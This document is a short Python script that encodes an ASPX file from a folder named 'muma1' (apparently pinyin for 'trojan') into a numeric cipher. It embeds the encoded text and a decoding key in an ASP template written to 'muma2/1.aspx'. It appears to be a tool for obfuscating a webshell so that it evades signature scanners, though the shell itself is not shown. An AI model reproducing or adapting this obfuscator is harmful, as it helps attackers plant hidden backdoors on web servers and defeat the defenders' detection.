import os
pwd = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&*()_+-=[]\\{}|;\':\",./<>? \r\n\t"
aspPwd = '''"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&*()_+-=[]\\{}|;':"",./<>? " & chr(13) & chr(10) + chr(9)'''


def encode(codePath = "muma1/index.aspx"):

    aspCode = open(codePath, "r").read()

    cText = ""
    for code in aspCode:
        i = 0
        while i < len(pwd):
            if code == pwd[i]:
                cText = cText + str(i) + "|"
            i+=1
    # cText = cText[:len(cText) - 1]
    # print(cText)
    return cText[:len(cText) - 1]

def creatAspFile(fileCode, filePath = "mode/asp.mode"):
    aspModeText = open(filePath,"r").read()
    aspModeText = aspModeText.replace("@@encode@@", "\"" + fileCode + "\"").replace("@@key@@", aspPwd)
    open("muma2/1.aspx", "w").write(aspModeText)

def decode(password):
    sc = ""
    enC = password.split("|")
    for en in enC:
        i = int(en)
        sc += pwd[i]
    print(sc)


ciry = encode()
print(ciry)
decode(ciry)



# test = '''asdf"\asdf'''
# open("muma2/1.aspx", "w").write(aspPwd)